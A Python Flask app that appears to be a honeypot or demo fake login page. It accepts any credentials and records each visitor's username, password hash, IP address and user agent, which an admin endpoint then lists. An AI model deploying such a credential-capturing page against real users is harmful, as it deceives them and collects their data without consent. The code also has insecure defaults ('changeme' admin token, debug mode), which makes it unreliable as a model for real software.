import os
import sqlite3
from datetime import datetime
from pathlib import Path
from flask import Flask, request, render_template, redirect, url_for, flash, abort, jsonify
from werkzeug.security import generate_password_hash

# Configuration via environment variables (so it's easy to change on the Pi)
DB_PATH = Path(os.environ.get("DB_PATH", "data.sqlite"))
CSV_PATH = Path(os.environ.get("CSV_PATH", "submissions.csv"))
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "changeme")  # set a stronger token before deploying
HOST = os.environ.get("FLASK_HOST", "127.0.0.1")
PORT = int(os.environ.get("FLASK_PORT", 5000))

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "dev-secret")  # set to a random value in prod

def ensure_db():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''
    CREATE TABLE IF NOT EXISTS submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password_hash TEXT NOT NULL,
        client_ip TEXT,
        user_agent TEXT,
        created_at TEXT NOT NULL
    )
    ''')
    conn.commit()
    conn.close()
    # ensure CSV exists with header
    if not CSV_PATH.exists():
        CSV_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(CSV_PATH, "w", encoding="utf-8") as f:
            f.write("id,username,password_hash,client_ip,user_agent,created_at\n")

def insert_submission(username, password_hash, client_ip, user_agent):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    created_at = datetime.utcnow().isoformat() + "Z"
    cur.execute(
        "INSERT INTO submissions (username, password_hash, client_ip, user_agent, created_at) VALUES (?, ?, ?, ?, ?)",
        (username, password_hash, client_ip, user_agent, created_at)
    )
    rowid = cur.lastrowid
    conn.commit()
    conn.close()
    # Append to CSV (use append mode)
    with open(CSV_PATH, "a", encoding="utf-8") as f:
        # basic CSV escaping - usernames shouldn't contain commas in this demo
        line = f'{rowid},{username},{password_hash},{client_ip},"{user_agent}",{created_at}\n'
        f.write(line)
    return rowid

@app.route("/", methods=["GET"])
def login_page():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def do_login():
    username = (request.form.get("username") or "").strip()
    password = (request.form.get("password") or "")
    if not username or not password:
        flash("Please enter both username and password", "error")
        return redirect(url_for("login_page"))

    # "Fake" authentication: we don't check password correctness.
    # We WILL hash the submitted password before storing it (good practice).
    password_hash = generate_password_hash(password)
    client_ip = request.remote_addr or "unknown"
    user_agent = request.headers.get("User-Agent", "")

    insert_submission(username, password_hash, client_ip, user_agent)

    # Redirect to a simple "dashboard" showing the (fake) user info
    return render_template("admin.html", username=username, email=f"{username}@example.com")

# simple admin API to list submissions (token-protected)
@app.route("/admin/submissions", methods=["GET"])
def admin_list():
    token = request.args.get("token") or request.headers.get("X-Admin-Token")
    if token != ADMIN_TOKEN:
        return abort(403)

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute("SELECT id, username, password_hash, client_ip, user_agent, created_at FROM submissions ORDER BY id DESC LIMIT 1000")
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return jsonify(rows)

if __name__ == "__main__":
    ensure_db()
    app.run(host=HOST, port=PORT, debug=True)
